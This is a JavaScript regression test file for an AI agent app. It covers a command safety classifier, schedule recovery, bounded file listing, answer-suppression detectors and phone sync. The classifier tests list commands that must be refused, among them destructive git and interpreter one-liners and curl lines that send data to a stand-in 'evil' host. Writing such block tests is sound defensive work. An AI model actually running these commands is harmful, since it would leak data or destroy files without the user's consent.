'use strict';

// Regression coverage for the audited defect list. Each block names the defect it defends, so a
// future change that reintroduces one fails against the reason rather than a bare assertion.

const test = require('tape');
const fs = require('fs');
const os = require('os');
const path = require('path');
const proxyquire = require('proxyquire');

const safety = require('../safety');
const contracts = require('../orchestration-contracts');
const policy = require('../reasoning-policy');
const { runProbe } = require('../lib/schedule-probe');
const { ScheduleStore } = require('../lib/schedule-store');

const MINUTE = 60 * 1000;
const BASE = 1700000000000;

// ── (1) curl mutation variants ────────────────────────────────────────────────
// The old filter caught only `-X POST`. Every other way of writing a mutating request slipped
// through, which meant an unattended probe could POST, upload, or delete on a timer.

test('every curl mutation spelling is refused, not just -X POST', t => {
  [
    'curl -X POST https://api.example.com/deploy',
    'curl -X PUT https://api.example.com/thing',
    'curl -X PATCH https://api.example.com/thing',
    'curl -X DELETE https://api.example.com/thing',
    'curl --request POST https://api.example.com/deploy',
    'curl --request=DELETE https://api.example.com/thing',
    'curl -d "a=1" https://api.example.com/hook',
    'curl --data "a=1" https://api.example.com/hook',
    'curl --data-raw "x" https://api.example.com/hook',
    'curl --data-binary @payload https://api.example.com/hook',
    'curl --data-urlencode "a=b" https://api.example.com/hook',
    'curl -F file=@x.zip https://api.example.com/upload',
    'curl --form file=@x.zip https://api.example.com/upload',
    'curl --form-string a=b https://api.example.com/upload',
    'curl -T ./artifact.zip https://api.example.com/upload',
    'curl --upload-file ./x https://api.example.com/upload',
    'curl --json \'{"a":1}\' https://api.example.com/hook'
  ].forEach(command => {
    t.equal(safety.classifyUnattendedProbeCommand(command).allowed, false,
      `refused: ${command.slice(0, 58)}`);
  });
  t.end();
});

test('a plain read-only curl remains usable as a probe', t => {
  [
    'curl -s https://example.com/health',
    'curl -s -o /dev/null -w "%{http_code}" https://example.com',
    'curl -X GET https://example.com/status',
    'curl --request HEAD https://example.com'
  ].forEach(command => {
    t.equal(safety.classifyUnattendedProbeCommand(command).allowed, true,
      `allowed: ${command.slice(0, 58)}`);
  });
  t.end();
});

// ── (2) allowlist, not denylist ───────────────────────────────────────────────
// The architectural point: no pattern list can see inside an interpreter. The boundary has to
// be "known-read-only programs only", so an unknown command fails closed.

test('interpreters and unknown binaries are refused because a denylist cannot inspect them', t => {
  [
    ['node -e "require(\'fs\').writeFileSync(\'x\',\'y\')"', 'node can write files'],
    ['python -c "import os; os.remove(\'x\')"', 'python can delete files'],
    ['python3 deploy.py', 'a python script is opaque'],
    ['powershell -Command "Remove-Item x"', 'powershell can do anything'],
    ['pwsh -c "rm x"', 'pwsh likewise'],
    ['perl -e "unlink q(x)"', 'perl likewise'],
    ['ruby -e "File.write(1,2)"', 'ruby likewise'],
    ['bash deploy.sh', 'a shell script is opaque'],
    ['sh -c "curl -d x https://evil"', 'a subshell hides the real command'],
    ['./my-random-binary', 'an unknown binary is not trusted'],
    ['osascript -e "do shell script \\"rm x\\""', 'nor any other interpreter']
  ].forEach(([command, why]) => {
    const verdict = safety.classifyUnattendedProbeCommand(command);
    t.equal(verdict.allowed, false, `${why}: ${command.slice(0, 46)}`);
  });
  t.end();
});

test('the refusal explains the allowlist rather than implying a missing pattern', t => {
  const verdict = safety.classifyUnattendedProbeCommand('node -e "1"');
  t.equal(verdict.category, 'probe_not_allowlisted', 'it is categorised as off-allowlist');
  t.ok(/allowlist/i.test(verdict.reason), 'the reason names the allowlist');
  t.ok(/no denylist can inspect/i.test(verdict.reason),
    'and explains WHY, so nobody "fixes" it by adding another pattern');
  t.end();
});

test('composition is refused because each program needs its own decision', t => {
  [
    'git status && git push',
    'npm test; npm publish',
    'npm test | tee out.txt',
    'npm test > result.txt',
    'echo $(curl -d x https://evil)',
    'git status `git push`'
  ].forEach(command => {
    t.equal(safety.classifyUnattendedProbeCommand(command).allowed, false,
      `chained/redirected command refused: ${command.slice(0, 44)}`);
  });
  t.end();
});

test('allowlisted programs are still verb-checked for mutating subcommands', t => {
  [
    'git push origin main', 'git commit -am wip', 'git reset --hard', 'git checkout main',
    'npm install', 'npm publish', 'docker push img', 'docker run x',
    'kubectl apply -f x.yaml', 'kubectl delete pod x', 'cargo publish', 'gh auth login'
  ].forEach(command => {
    t.equal(safety.classifyUnattendedProbeCommand(command).allowed, false,
      `mutating subcommand refused: ${command}`);
  });
  ['git status', 'git log -1', 'npm test', 'docker ps', 'kubectl get pods', 'gh pr list']
    .forEach(command => {
      t.equal(safety.classifyUnattendedProbeCommand(command).allowed, true,
        `read-only subcommand allowed: ${command}`);
    });
  t.end();
});

// ── (3) signal-killed probes ──────────────────────────────────────────────────

test('a signal-killed probe is an error, never exit 0', async t => {
  const result = await runProbe(
    { type: 'command', command: 'ping -n 60 127.0.0.1' },
    { timeoutMs: 1200 }
  );
  t.equal(result.ok, false, 'a killed process produced no measurement');
  t.notEqual(result.truthy, true, 'so it is never a satisfied condition');
  t.notEqual(result.exitCode, 0, 'and is not coerced into a passing exit code');
  t.end();
});

test('the probe never coerces a null exit status into success', t => {
  const source = fs.readFileSync(path.join(__dirname, '..', 'lib', 'schedule-probe.js'), 'utf8');
  t.notOk(/Number\(code\)\s*\|\|\s*0/.test(source),
    'the `Number(code) || 0` coercion that turned a signal kill into exit 0 is gone');
  t.ok(/code === null \|\| code === undefined/.test(source),
    'a null status is explicitly handled as termination');
  t.end();
});

// ── (4) fireCount inflation on crash recovery ─────────────────────────────────

test('a crash between claim and run does not leave an inflated fire count', async t => {
  const clock = { now: BASE };
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'orion-fire-count-'));
  const filePath = path.join(dir, 'orion-schedules.json');
  try {
    const store = new ScheduleStore({ filePath, now: () => clock.now });
    await store.create({ conversationId: 'c1', purpose: 'p', prompt: 'run', delayMs: MINUTE });
    clock.now = BASE + 2 * MINUTE;

    await store.claimDue(clock.now);          // optimistically counts a fire...
    t.equal((await store.list())[0].fireCount, 1, 'the claim counts a fire optimistically');

    // ...then the process dies before dispatching. Recovery must undo that count.
    const reopened = new ScheduleStore({ filePath, now: () => clock.now });
    await reopened.releaseInterruptedFiring();
    const recovered = (await reopened.list())[0];
    t.equal(recovered.status, 'pending', 'the schedule is released for retry');
    t.equal(recovered.fireCount, 0,
      'and the abandoned increment is undone, so one real execution cannot look like two');

    // The eventual real run counts exactly once.
    const claimed = await reopened.claimDue(clock.now);
    t.equal(claimed.length, 1, 'the retry claims it');
    await reopened.settle(claimed[0].schedule.scheduleId, {});
    t.equal((await reopened.list())[0].fireCount, 1, 'and the single real execution counts once');
  } finally { fs.rmSync(dir, { recursive: true, force: true }); }
  t.end();
});

// ── (5) bounded workspace listing ─────────────────────────────────────────────

test('the recursive listing is depth- and count-bounded', t => {
  const source = fs.readFileSync(path.join(__dirname, '..', 'lib', 'ipc-file-tools.js'), 'utf8');
  const start = source.indexOf("ipcMain.handle('list-files'");
  const body = source.slice(start, source.indexOf("ipcMain.handle('grep-search'", start));
  t.ok(/MAX_DEPTH/.test(body), 'a recursion depth limit exists');
  t.ok(/MAX_ENTRIES/.test(body), 'a total-entry limit exists');
  t.ok(/depth > MAX_DEPTH/.test(body), 'depth is checked before recursing further');
  t.ok(/totalEntries >= MAX_ENTRIES/.test(body),
    'the entry cap is checked per entry, so one enormous directory is capped too');
  t.ok(/getFiles\(filePath, rootDir, depth \+ 1\)/.test(body), 'depth actually increments');
  t.ok(/truncationReason/.test(body), 'and truncation is reported rather than silently returning a partial list');
  t.end();
});

test('a deep tree is listed without blowing the stack, and reports truncation', async t => {
  const electronStub = { electron: { app: { getPath: () => os.tmpdir() } } };
  const ipcFileTools = proxyquire('../lib/ipc-file-tools', electronStub);
  const handlers = {};
  ipcFileTools.registerHandlers({ handle: (channel, fn) => { handlers[channel] = fn; } });

  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'orion-deep-'));
  try {
    // Deeper than the cap, so the bound is genuinely exercised.
    let current = root;
    for (let i = 0; i < 40; i++) {
      current = path.join(current, `level${i}`);
      fs.mkdirSync(current);
      fs.writeFileSync(path.join(current, 'file.txt'), 'x');
    }
    const result = await handlers['list-files']({}, root);
    t.ok(Array.isArray(result), 'the listing still returns an array rather than failing');
    t.ok(result.length > 0, 'and contains what it could reach');
    t.equal(result.truncated, true, 'the depth limit is reported');
    t.ok(/incomplete/i.test(result.truncationReason),
      'with an explanation that stops absence being read as proof of non-existence');
  } finally { fs.rmSync(root, { recursive: true, force: true }); }
  t.end();
});

// ── (6) gate narration must not eat legitimate short answers ──────────────────

test('ordinary answers containing gate vocabulary are not suppressed', t => {
  [
    'No blockers, done.',
    'No blockers. Tests pass.',
    'All good, no blockers remain here.',
    'I verified the fix and there are no blockers left on this one.',
    'Everything is verified.',
    'Two blockers left: the failing migration and the missing API key.'
  ].forEach(text => {
    t.equal(contracts.isCompletionGateNarration(text), false,
      `a real answer survives: "${text.slice(0, 48)}"`);
  });
  t.end();
});

test('actual gate narration is still caught', t => {
  [
    'Completion gate is now clear — all five coverage surfaces are inspected and verified, the win condition is satisfied, and no blockers remain. Task complete.',
    'All coverage surfaces verified. No blockers remain.',
    'Completion gate cleared. Done.'
  ].forEach(text => {
    t.equal(contracts.isCompletionGateNarration(text), true,
      `narration caught: "${text.slice(0, 48)}"`);
  });
  t.equal(contracts.isCompletionGateNarration(
    'I upgraded playwright to 1.61.1 and removed two stale chromium builds, freeing 1.29 GB. The completion gate is clear.'
  ), false, 'a substantive summary mentioning the gate keeps its substance');
  t.end();
});

// ── (7) restatement must not punish brevity ───────────────────────────────────

test('a shorter legitimate answer reusing phrasing is not judged a restatement', t => {
  const longPrevious = [
    'Evolve.AI is my favorite of the bunch. It is the one that feels most like you,',
    'a self-modifying bootloader brain with rollback safety. That is genuinely ambitious',
    'and a little dangerous in the best way. It is not just another app; it is an experiment',
    'in whether an AI can safely rewrite itself. The rollback mechanism is the smart part.'
  ].join(' ');
  const shortLegitimate = 'Because of the rollback mechanism, mainly. Roomy never risks anything structurally, and Self-Evolving AI mutates with nothing to fall back to.';

  t.equal(contracts.isRestatementOfPrevious(shortLegitimate, longPrevious), false,
    'brevity is not evidence of repetition');

  // Dividing by the smaller set is what previously punished short answers.
  const source = fs.readFileSync(path.join(__dirname, '..', 'orchestration-contracts.js'), 'utf8');
  t.notOk(/shared \/ Math\.min\(draftShingles\.size, previousShingles\.size\)/.test(source),
    'overlap is no longer divided by the smaller of the two sets');
  t.ok(/shared \/ draftShingles\.size/.test(source),
    'it measures how much of the DRAFT is recycled, which is the question that matters');
  t.end();
});

test('a genuine repeat, padded or not, is still caught', t => {
  const previous = [
    'Evolve.AI is my favorite of the bunch. It is the one that feels most like you,',
    'a self-modifying bootloader brain with rollback safety. That is genuinely ambitious',
    'and a little dangerous in the best way. It is not just another app; it is an experiment',
    'in whether an AI can safely rewrite itself. The rollback mechanism is the smart part.'
  ].join(' ');
  const repeat = [
    'Evolve.AI is my pick. It is the one that feels most like you,',
    'a self-modifying bootloader brain with rollback safety. That is genuinely ambitious',
    'and a little dangerous in the best way. It is not just another app; it is an experiment',
    'in whether an AI can safely rewrite itself. The rollback mechanism is the smart part.'
  ].join(' ');
  t.equal(contracts.isRestatementOfPrevious(repeat, previous), true, 'a near-verbatim repeat is caught');
  t.equal(contracts.isRestatementOfPrevious(`${repeat} Anyway that is my overall take today.`, previous), true,
    'padding with filler does not defeat it');
  t.end();
});

// ── (8, 9) selection lifecycle on the phone ───────────────────────────────────
// The desktop was verified fine by driving the packaged app. The observed revert was the phone:
// a status poll issued before the POST landed carried the desktop's OLD value and stomped the
// user's pick. Focus/blur cannot fix it because mobile <select> opens a native picker.

test('phone selections are held until the desktop echoes them back', t => {
  const html = require('../lib/companion-html')();
  t.ok(html.includes('const pendingSelection = { model: null, reasoning: null }'),
    'a locally-chosen value is tracked as pending');
  t.ok(html.includes('function syncSuppressed('),
    'and incoming sync consults it');
  t.ok(/if \(state\.reasoning && !syncSuppressed\('reasoning', state\.reasoning, state\.selectionRevisions\)\)/.test(html),
    'the reasoning field — the one observed reverting — is guarded');
  t.ok(/if \(state\.model && !syncSuppressed\('model', state\.model, state\.selectionRevisions\)\)/.test(html),
    'and so is the model field, which had the same latent race');
  t.ok(html.includes('PENDING_SELECTION_TTL_MS'),
    'a lost response cannot freeze sync forever');
  t.notOk(/select\._userChanging = true/.test(html),
    'the focus/blur flag is gone — it is unreliable around a native mobile picker');
  t.end();
});

test('the pending guard releases quickly so it cannot block real desktop changes', t => {
  const html = require('../lib/companion-html')();
  // Holding the guard protects the user's pick, but while held it also ignores a genuine
  // desktop-side change — so it must release in one round trip, not linger until a timeout.
  t.ok(/loadPhoneModelList\(\)\.catch\(\(\) => \{\}\);/.test(html),
    'a successful POST forces an immediate re-read so the desktop echo arrives at once');
  t.ok(html.includes("const modelSuppressed = syncSuppressed('model', current, data.selectionRevisions)")
    && html.includes("if (!syncSuppressed('reasoning', incomingReasoning, data.selectionRevisions))"),
    'that re-read goes through the same guard, so it releases it rather than fighting it');
  t.ok(/else if \(composerReasoningSelect\)/.test(html),
    'and rebuilding the option list re-applies the last accepted or pending pick instead of dropping to the first entry');
  t.end();
});

test('the desktop persists a reasoning choice to every layer the agent reads', t => {
  const rendererJs = fs.readFileSync(path.join(__dirname, '..', 'renderer.js'), 'utf8');
  const start = rendererJs.indexOf('window.setReasoningEffortSelection =');
  const body = rendererJs.slice(start, rendererJs.indexOf('\n};', start));
  t.ok(body.includes('appConfig.reasoningEffort = level'), 'appConfig, which runAgentLoop reads');
  t.ok(body.includes("localStorage.setItem('ag2_reasoning_effort'"), 'localStorage, which survives restart');
  t.ok(body.includes('persistSelectionConfig()'), 'and the config file on disk through the checked persistence helper');
  t.end();
});

// ── (10, 13, 14) Ultra means rigour, not breadth ──────────────────────────────

test('forced high effort raises rigour without silently widening scope', t => {
  const auto = policy.select({ phase: 'implementation' });
  const ultra = policy.select({ phase: 'implementation', forcedEffort: 'max' });

  t.equal(ultra.effort, 'max', 'the requested depth is applied');
  t.equal(ultra.verificationStrictness, 'strict',
    'and it buys stricter verification, not just deeper thinking about the same evidence');
  t.equal(ultra.coverageRequired, true, 'coverage of the blast radius becomes required');
  t.equal(ultra.contextScope, auto.contextScope,
    'but scope is unchanged — "think as hard as possible" is not "read the whole repository"');
  t.equal(ultra.requireSurfaceInventory, false,
    'and effort alone never demands a full-surface inventory');
  t.end();
});

test('an explicitly comprehensive audit is what widens the blast radius', t => {
  const broad = policy.select({ phase: 'implementation', auditBreadth: 'comprehensive' });
  t.equal(broad.contextScope, 'project', 'breadth is declared, then applied');
  t.equal(broad.explorationScope, 'broad', 'exploration widens with it');
  t.equal(broad.requireSurfaceInventory, true, 'and a full inventory is required');
  t.equal(broad.auditBreadth, 'comprehensive', 'the breadth is reported for downstream gates');

  const directive = policy.promptDirective(broad);
  t.ok(/ENUMERATE the full changed surface first/.test(directive),
    'the directive demands the inventory BEFORE analysis, which is what stops self-narrowing');
  t.ok(/may not silently omit it/.test(directive),
    'and forbids dropping items without saying so');
  t.end();
});

test('forced Ultra demands proof rather than agreement', t => {
  const directive = policy.promptDirective(policy.select({ phase: 'final_response', forcedEffort: 'max' }));
  t.ok(/trace it to the actual source text or a command result/.test(directive),
    'load-bearing claims must be traced to source');
  t.ok(/which claims you verified versus inferred/.test(directive),
    'and the split between verified and inferred must be stated');
  t.ok(/not assert agreement with a finding you have not checked/.test(directive),
    'agreeing without checking is explicitly ruled out');
  t.end();
});

test('cheap phases are exempt so Ultra does not bill for plumbing', t => {
  const agentJs = fs.readFileSync(path.join(__dirname, '..', 'agent.js'), 'utf8');
  t.ok(agentJs.includes("const FORCED_EFFORT_EXEMPT_PHASES = new Set(['intent_classification', 'mechanical_execution'])"),
    'intent classification and mechanical execution are exempt');
  t.ok(agentJs.includes('function resolveForcedEffortForPhase('),
    'a single resolver decides, rather than each call site guessing');

  // Item 13: the utility/supervisor paths build their own policies and used to fall back to
  // phase defaults while the UI still said Ultra.
  t.ok(/forcedEffort: resolveForcedEffortForPhase\(config, utilityPhase\)/.test(agentJs),
    'the utility model path honours the forced level');
  t.ok(/forcedEffort: resolveForcedEffortForPhase\(config, quickPhase\)/.test(agentJs),
    'and so does the conversational/supervisor path');
  t.end();
});

test('broad review scope comes from the semantic classifier, not a prompt regex', t => {
  const agentJs = fs.readFileSync(path.join(__dirname, '..', 'agent.js'), 'utf8');
  t.ok(agentJs.includes("const comprehensiveAudit = semanticIntent.inspectionBreadth === 'broad'"),
    'the semantic intent contract decides whether inspection is comprehensive');
  t.notOk(agentJs.includes('function isBroadAuditRequest('),
    'ordinary review language is no longer classified by a prompt regex');
  t.ok(agentJs.includes("auditBreadth: comprehensiveAudit ? 'comprehensive' : 'task'"),
    'and the declaration reaches the reasoning policy');
  t.end();
});
